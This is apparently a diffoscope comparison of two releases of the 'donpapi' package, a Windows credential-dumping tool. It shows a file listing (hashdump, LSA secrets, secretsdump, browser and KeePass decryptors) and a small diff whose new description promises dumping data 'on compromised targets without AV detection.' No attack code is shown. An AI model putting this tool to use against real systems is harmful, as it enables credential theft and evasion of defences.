+-rw-r--r--   0        0        0     6155 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/WinStructures.py
+-rw-r--r--   0        0        0     1081 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/__init__.py
+-rw-r--r--   0        0        0      155 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/structures.py
+-rw-r--r--   0        0        0     3336 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/utils.py
+-rw-r--r--   0        0        0       92 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/version.py
+-rw-r--r--   0        0        0     1227 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/wintools.py
+-rw-r--r--   0        0        0     6004 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/manage_modules.py
+-rw-r--r--   0        0        0     1407 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/module_info.py
+-rw-r--r--   0        0        0    10076 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/run.py
+-rw-r--r--   0        0        0     2939 2023-07-12 08:43:58.645790 donpapi-1.1.0/donpapi/lazagne/config/users.py
+-rw-r--r--   0        0        0    20971 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/config/winstructure.py
+-rw-r--r--   0        0        0    14449 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/config/write_output.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/__init__.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/browsers/__init__.py
+-rw-r--r--   0        0        0    10511 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/browsers/chromium_based.py
+-rw-r--r--   0        0        0     6989 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/browsers/ie.py
+-rw-r--r--   0        0        0    23438 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/browsers/mozilla.py
+-rw-r--r--   0        0        0      880 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/browsers/ucbrowser.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/chats/__init__.py
+-rw-r--r--   0        0        0      917 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/chats/pidgin.py
+-rw-r--r--   0        0        0     1993 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/chats/psi.py
+-rw-r--r--   0        0        0     5133 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/chats/skype.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/databases/__init__.py
+-rw-r--r--   0        0        0     2792 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/databases/dbvis.py
+-rw-r--r--   0        0        0     1019 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/databases/postgresql.py
+-rw-r--r--   0        0        0     3919 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/databases/robomongo.py
+-rw-r--r--   0        0        0     4374 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/databases/sqldeveloper.py
+-rw-r--r--   0        0        0      945 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/databases/squirrel.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/games/__init__.py
+-rw-r--r--   0        0        0     1828 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/games/galconfusion.py
+-rw-r--r--   0        0        0     1336 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/games/kalypsomedia.py
+-rw-r--r--   0        0        0     1378 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/games/roguestale.py
+-rw-r--r--   0        0        0     1776 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/games/turba.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/git/__init__.py
+-rw-r--r--   0        0        0     2263 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/git/gitforwindows.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/mails/__init__.py
+-rw-r--r--   0        0        0     3662 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/mails/outlook.py
+-rw-r--r--   0        0        0      280 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/mails/thunderbird.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/maven/__init__.py
+-rw-r--r--   0        0        0     5712 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/maven/mavenrepositories.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/memory/__init__.py
+-rw-r--r--   0        0        0     1171 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/memory/keepass.py
+-rw-r--r--   0        0        0   361825 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/memory/keethief.py
+-rw-r--r--   0        0        0     2159 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/__init__.py
+-rw-r--r--   0        0        0     9068 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/common.py
+-rw-r--r--   0        0        0     1638 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/crypto.py
+-rw-r--r--   0        0        0     4214 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/hbio.py
+-rw-r--r--   0        0        0    15332 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/kdb4.py
+-rw-r--r--   0        0        0    13773 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/pureSalsa20.py
+-rw-r--r--   0        0        0     6259 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/memory/memorydump.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/multimedia/__init__.py
+-rw-r--r--   0        0        0     4144 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/multimedia/eyecon.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/php/__init__.py
+-rw-r--r--   0        0        0     2199 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/php/composer.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/svn/__init__.py
+-rw-r--r--   0        0        0     2448 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/svn/tortoise.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/__init__.py
+-rw-r--r--   0        0        0     2409 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/apachedirectorystudio.py
+-rw-r--r--   0        0        0     1950 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/coreftp.py
+-rw-r--r--   0        0        0     2107 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/cyberduck.py
+-rw-r--r--   0        0        0    13660 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/d3des.py
+-rw-r--r--   0        0        0     2049 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/filezilla.py
+-rw-r--r--   0        0        0     1493 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/filezillaserver.py
+-rw-r--r--   0        0        0     1640 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/ftpnavigator.py
+-rw-r--r--   0        0        0     2454 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/iisapppool.py
+-rw-r--r--   0        0        0     5312 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/iiscentralcertp.py
+-rw-r--r--   0        0        0     5427 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/keepassconfig.py
+-rw-r--r--   0        0        0     4016 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/opensshforwindows.py
+-rw-r--r--   0        0        0     2109 2023-07-12 08:43:58.649792 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/openvpn.py
+-rw-r--r--   0        0        0     1628 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/puttycm.py
+-rw-r--r--   0        0        0     3610 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/rdpmanager.py
+-rw-r--r--   0        0        0     3184 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/unattended.py
+-rw-r--r--   0        0        0     6857 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/vnc.py
+-rw-r--r--   0        0        0     4078 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/winscp.py
+-rw-r--r--   0        0        0     1543 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/wsl.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/wifi/__init__.py
+-rw-r--r--   0        0        0     4629 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/wifi/wifi.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/__init__.py
+-rw-r--r--   0        0        0     1614 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/autologon.py
+-rw-r--r--   0        0        0      699 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/cachedump.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/__init__.py
+-rw-r--r--   0        0        0     4434 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/addrspace.py
+-rw-r--r--   0        0        0    10218 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/newobj.py
+-rw-r--r--   0        0        0     4990 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/object.py
+-rw-r--r--   0        0        0     2542 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/types.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/win32/__init__.py
+-rw-r--r--   0        0        0     4411 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/win32/domcachedump.py
+-rw-r--r--   0        0        0    10430 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/win32/hashdump.py
+-rw-r--r--   0        0        0     5138 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/win32/lsasecrets.py
+-rw-r--r--   0        0        0     2297 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/win32/rawreg.py
+-rw-r--r--   0        0        0      899 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/credfiles.py
+-rw-r--r--   0        0        0     1455 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/credman.py
+-rw-r--r--   0        0        0      528 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/hashdump.py
+-rw-r--r--   0        0        0     1227 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/lsa_secrets.py
+-rw-r--r--   0        0        0     2717 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/ppypykatz.py
+-rw-r--r--   0        0        0     2942 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/vault.py
+-rw-r--r--   0        0        0      920 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/vaultfiles.py
+-rw-r--r--   0        0        0     3275 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lazagne/softwares/windows/windows.py
+-rw-r--r--   0        0        0     4974 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/RecentFiles.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/__init__.py
+-rw-r--r--   0        0        0    16870 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/adconnect.py
+-rw-r--r--   0        0        0    42137 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/certificates.py
+-rw-r--r--   0        0        0     4605 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/compliance_security.py
+-rw-r--r--   0        0        0     2141 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/defines.py
+-rw-r--r--   0        0        0    30179 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/dpapi.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/dpapi_pick/__init__.py
+-rw-r--r--   0        0        0    11994 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/dpapi_pick/credhist.py
+-rw-r--r--   0        0        0    14585 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/dpapi_pick/crypto.py
+-rw-r--r--   0        0        0     4466 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/dpapi_pick/eater.py
+-rw-r--r--   0        0        0     4466 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/eater.py
+-rw-r--r--   0        0        0    10656 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/fileops.py
+-rw-r--r--   0        0        0     3938 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/neo4jconnection.py
+-rw-r--r--   0        0        0     3006 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/new_module.py
+-rw-r--r--   0        0        0    19699 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/reg.py
+-rw-r--r--   0        0        0   116877 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/secretsdump.py
+-rw-r--r--   0        0        0     3542 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/toolbox.py
+-rw-r--r--   0        0        0     3484 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/lib/wmi.py
+-rw-r--r--   0        0        0   110592 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/myseatbelt.py
+-rw-r--r--   0        0        0     5699 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/myusers.py
+-rw-r--r--   0        0        0    52548 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/res/Logo_LOGIN.PNG
+-rw-r--r--   0        0        0     3429 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/res/style.css
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/__init__.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/browser/__init__.py
+-rw-r--r--   0        0        0    10188 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/browser/chrome_decrypt.py
+-rw-r--r--   0        0        0     7015 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/browser/firefox_decrypt.py
+-rw-r--r--   0        0        0    17891 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/browser/mozilla.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/manager/__init__.py
+-rw-r--r--   0        0        0    23725 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/manager/keepass.py
+-rw-r--r--   0        0        0     4486 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/manager/lastpass.py
+-rw-r--r--   0        0        0     5902 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/manager/mRemoteNG-local.py
+-rw-r--r--   0        0        0    12420 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/manager/mRemoteNG.py
+-rw-r--r--   0        0        0        0 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/sysadmin/__init__.py
+-rw-r--r--   0        0        0    13660 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/sysadmin/d3des.py
+-rw-r--r--   0        0        0     6545 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/sysadmin/mobaxterm.py
+-rw-r--r--   0        0        0     2186 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/sysadmin/putty.py
+-rw-r--r--   0        0        0      210 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/sysadmin/teamviewer.py
+-rw-r--r--   0        0        0     2653 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/sysadmin/vnc-local.py
+-rw-r--r--   0        0        0     9808 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/sysadmin/vnc.py
+-rw-r--r--   0        0        0     6545 2023-07-12 08:43:58.653794 donpapi-1.1.0/donpapi/software/sysadmin/winscp.py
+-rw-r--r--   0        0        0     1040 2023-07-12 08:43:58.653794 donpapi-1.1.0/pyproject.toml
+-rw-r--r--   0        0        0    11514 2023-07-12 08:43:58.653794 donpapi-1.1.0/readme.md
+-rw-r--r--   0        0        0    12526 1970-01-01 00:00:00.000000 donpapi-1.1.0/PKG-INFO
```

### Comparing `donpapi-1.0.1/donpapi/database.py` & `donpapi-1.1.0/donpapi/database.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/entry.py` & `donpapi-1.1.0/donpapi/entry.py`

 * *Files 1% similar despite different names*

```diff
@@ -32,18 +32,18 @@
 
 global assets
 assets={}
 
 BANNER = """
                                                                                 
          ,                                                                      
-       ,                                                                        
+       ,                                                 LeHack Release! \U0001F480                       
         (                                                                       
-       .                                                                        
-                                &&&&&&                   LeHack Release! \U0001F480                                          
+       .                                          by Touf & Zblurx @ Login-Securite                       
+                                &&&&&&                                                             
      &&&&&%%%.                  &&&&&&                                          
       &&&&%%%              &&&& &&&&&&       &&&&&&            &&&&&.           
       &&&&%%%           &&&&&&& &&&&&&    &&&&&&&&&&&&&     &&&&&&&&&&&         
       &&&&%%%         &&&&&&&&& &&&&&&  &&&&&&&&&&&&&&&&   &&&&&&&&&&&&&        
     &&&&&&%%%%%       &&&&&&    &&&&&&  &&&&&&    &&&&&&   &&&&&   &&&&&   #####  
  &&&&&&&&&%%%%%%%     &&&&&&&&&&&&&&&&  (&&&&&&&&&&&&&&&   &&&&&   &&&&&   # # #
  &/&/////////////%      &&&&&&&&&&&&      &&&&&&&&&&&&     &&&&&   &&&&&   #####
@@ -58,15 +58,15 @@
 &&#&###########/#%    &&&&&&                             &&&&&&                 
 &&###############%    &&&&&&                             &&&&&&                
 """
 
 def main():
 	global assets
 	print(BANNER)
-	parser = argparse.ArgumentParser(add_help = True, description = "SeatBelt implementation.")
+	parser = argparse.ArgumentParser(add_help = True, description = "Dump revelant information on compromised targets without AV detection.")
 
 	parser.add_argument('target', nargs='?', action='store', help='[[domain/]username[:password]@]<targetName or address>',default='')
 	parser.add_argument('-credz', action='store', help='File containing multiple user:password or user:hash for masterkeys decryption')
 	parser.add_argument('-pvk', action='store', help='input backupkey pvk file')
 	parser.add_argument('-d','--debug', action='store_true', help='Turn DEBUG output ON')
 	parser.add_argument('-t',  default='30', metavar="number of threads",  help='number of threads')
 	parser.add_argument('-o', '--output_directory', default='./', help='output log directory')
```

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/DPAPI/blob.py` & `donpapi-1.1.0/donpapi/lazagne/config/DPAPI/blob.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/DPAPI/credfile.py` & `donpapi-1.1.0/donpapi/lazagne/config/DPAPI/credfile.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/DPAPI/credhist.py` & `donpapi-1.1.0/donpapi/lazagne/config/DPAPI/credhist.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/DPAPI/crypto.py` & `donpapi-1.1.0/donpapi/lazagne/config/DPAPI/crypto.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/DPAPI/eater.py` & `donpapi-1.1.0/donpapi/lazagne/config/DPAPI/eater.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/DPAPI/masterkey.py` & `donpapi-1.1.0/donpapi/lazagne/config/DPAPI/masterkey.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/DPAPI/system.py` & `donpapi-1.1.0/donpapi/lazagne/config/DPAPI/system.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/DPAPI/vault.py` & `donpapi-1.1.0/donpapi/lazagne/config/DPAPI/vault.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/change_privileges.py` & `donpapi-1.1.0/donpapi/lazagne/config/change_privileges.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/constant.py` & `donpapi-1.1.0/donpapi/lazagne/config/constant.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/crypto/pyDes.py` & `donpapi-1.1.0/donpapi/lazagne/config/crypto/pyDes.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/crypto/pyaes/__init__.py` & `donpapi-1.1.0/donpapi/lazagne/config/crypto/pyaes/__init__.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/crypto/pyaes/aes.py` & `donpapi-1.1.0/donpapi/lazagne/config/crypto/pyaes/aes.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/crypto/pyaes/blockfeeder.py` & `donpapi-1.1.0/donpapi/lazagne/config/crypto/pyaes/blockfeeder.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/crypto/pyaes/util.py` & `donpapi-1.1.0/donpapi/lazagne/config/crypto/pyaes/util.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/crypto/rc4.py` & `donpapi-1.1.0/donpapi/lazagne/config/crypto/rc4.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/dico.py` & `donpapi-1.1.0/donpapi/lazagne/config/dico.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/dpapi_structure.py` & `donpapi-1.1.0/donpapi/lazagne/config/dpapi_structure.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/execute_cmd.py` & `donpapi-1.1.0/donpapi/lazagne/config/execute_cmd.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/Address.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/Address.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/BaseProcess.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/BaseProcess.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/LinProcess.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/LinProcess.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/Locator.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/Locator.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/MemWorker.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/MemWorker.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/OSXProcess.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/OSXProcess.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/SunProcess.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/SunProcess.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/WinProcess.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/WinProcess.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/WinStructures.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/WinStructures.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/__init__.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/__init__.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/utils.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/utils.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/lib/memorpy/wintools.py` & `donpapi-1.1.0/donpapi/lazagne/config/lib/memorpy/wintools.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/manage_modules.py` & `donpapi-1.1.0/donpapi/lazagne/config/manage_modules.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/module_info.py` & `donpapi-1.1.0/donpapi/lazagne/config/module_info.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/run.py` & `donpapi-1.1.0/donpapi/lazagne/config/run.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/users.py` & `donpapi-1.1.0/donpapi/lazagne/config/users.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/winstructure.py` & `donpapi-1.1.0/donpapi/lazagne/config/winstructure.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/config/write_output.py` & `donpapi-1.1.0/donpapi/lazagne/config/write_output.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/browsers/chromium_based.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/browsers/chromium_based.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/browsers/ie.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/browsers/ie.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/browsers/mozilla.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/browsers/mozilla.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/browsers/ucbrowser.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/browsers/ucbrowser.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/chats/pidgin.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/chats/pidgin.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/chats/psi.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/chats/psi.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/chats/skype.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/chats/skype.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/databases/dbvis.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/databases/dbvis.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/databases/postgresql.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/databases/postgresql.py`

 * *Files identical despite different names*

